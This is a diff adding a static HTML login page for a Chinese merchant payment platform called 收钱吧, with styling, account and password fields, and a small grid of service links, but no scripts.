@@ -1,0 +1,20 @@
+<!doctype html><html lang="zh-CN"><head><meta charset="utf-8"><title>收钱吧商户平台 - 登录</title>
+<style>body{margin:0;font-family:"Microsoft YaHei",Arial,sans-serif;background:#f0f6ff;color:#333}
+header{background:#1677ff;color:#fff;padding:14px 40px;display:flex;align-items:center;gap:24px}
+.logo{font-size:24px;font-weight:700;letter-spacing:2px}
+.card{margin:40px auto;width:400px;background:#fff;border-radius:12px;padding:32px;box-shadow:0 2px 12px #0001}
+.card h2{margin:0 0 6px;font-size:20px;color:#1677ff}.card p{margin:0 0 16px;font-size:13px;color:#999}
+label{display:block;font-size:13px;color:#555;margin:12px 0 6px}
+input{width:100%;height:40px;border:1px solid #ccd;border-radius:6px;padding:0 10px;font-size:14px;box-sizing:border-box}
+button{width:100%;height:42px;margin-top:18px;background:#1677ff;color:#fff;border:none;border-radius:6px;font-size:15px;cursor:pointer}
+.grid{margin:18px 40px;display:grid;grid-template-columns:repeat(3,1fr);gap:14px}
+.cell{background:#fff;border-radius:10px;padding:16px;font-size:13px;color:#666;min-height:64px;box-shadow:0 1px 3px #0001}
+footer{padding:20px;text-align:center;color:#999;font-size:12px}</style></head>
+<body><header><span class="logo">收钱吧</span><span>商户服务平台</span></header>
+<div class="card"><h2>商户登录</h2><p>收款账户登录，查看今日流水</p>
+<form action="/merchant/login" method="post">
+<label>商户账号</label><input placeholder="手机号">
+<label>密码</label><input type="password" placeholder="请输入密码">
+<button type="submit">登录商户平台</button></form></div>
+<div class="grid"><div class="cell">扫码收款</div><div class="cell">账单对账</div><div class="cell">提现到卡</div></div>
+<footer>© 收钱吧商户服务平台</footer></body></html>
